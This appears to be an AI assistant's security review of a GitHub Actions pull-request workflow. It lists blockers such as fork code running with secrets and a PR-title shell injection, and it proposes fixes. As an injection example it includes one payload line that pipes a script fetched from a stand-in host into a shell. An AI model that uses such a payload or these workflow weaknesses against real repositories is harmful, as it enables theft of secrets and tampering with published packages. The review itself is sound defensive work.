reply:
**Verdict: `request changes`.** Don't enable this on forks yet. As written, anyone with a GitHub account can open a pull request and run their own code with a write-all token and the `NPM_TOKEN` secret.

The repository has one workflow, `.github/workflows/pr-checks.yml`. There are no composite actions or other pipeline files.

## Findings

| Severity | Location | Evidence | Who can trigger it, and what they gain | Suggested direction |
| --- | --- | --- | --- | --- |
| blocker | `.github/workflows/pr-checks.yml:4,14,22-23` | `pull_request_target` + `ref: ${{ github.event.pull_request.head.sha }}` + `npm ci` / `npm test` | Any fork author. A changed `package.json`, install script or test file runs with secrets and a write token. They can push to branches, change releases, or publish to npm. | Switch the trigger to `pull_request`. It runs fork code with a read-only token and no secrets. Keep `pull_request_target` only for jobs that never check out or run the PR's code. |
| blocker | `.github/workflows/pr-checks.yml:19` | `run: echo "Testing ${{ github.event.pull_request.title }}"` | Any fork author. A title like `"; curl evil.sh \| sh; "` runs as shell code in the privileged job, even without the checkout. | Pass it through `env:` (`PR_TITLE: ${{ github.event.pull_request.title }}`) and use `"$PR_TITLE"` in the script. |
| major | `.github/workflows/pr-checks.yml:25` | `run: echo "token is ${{ secrets.NPM_TOKEN }}"` | Anyone who can trigger the job. The secret goes straight into the log. GitHub only masks exact matches, so encoded or split copies leak. With the blockers above, an attacker can also read it directly. | Remove this step. If `NPM_TOKEN` has been printed in any past run, rotate it. |
| major | `.github/workflows/pr-checks.yml:10` (and no top-level block at line 1) | `permissions: write-all` | Whoever gets code running in the job (see the blockers) gets every write scope: contents, packages, actions, workflows and so on. A test job needs none of them. | Add `permissions: contents: read` at the top level, and only grant more per job where a step needs it. |
| minor | `.github/workflows/pr-checks.yml:12-14` | `actions/checkout@v4` without `persist-credentials: false` | Later steps (here, the PR's own code) can read the token from `.git/config`. | Set `persist-credentials: false`, because nothing in this job pushes. |
| minor | `.github/workflows/pr-checks.yml:12,15` | `actions/checkout@v4`, `actions/setup-node@v4` | If either tag moves to a compromised commit, that commit runs in this job. | Pin each to its full commit SHA with the tag in a comment, and keep them updated with Dependabot. |

The fix is to switch the trigger to `pull_request`, set `contents: read`, delete the Debug step, and move the title into `env:`. That clears both blockers and both majors. Nothing in this job seems to need `pull_request_target`.

## Checks

- **Bundled checker:** I ran `check-workflow.mjs` on the workflow. It reported 8 problems, all included in the table above.
- **zizmor and actionlint:** they couldn't run because neither is installed (`command not found`). The repository has no pre-commit or CI config that sets up other linters.
- **Report structure check:** I didn't run `check-review-report.mjs`. This session only lets me write under `.github/**`, so I didn't save a report file to check.
- **Edits:** I didn't edit or trigger the workflow. I can make the fixes above in `.github/workflows/pr-checks.yml` if you'd like.
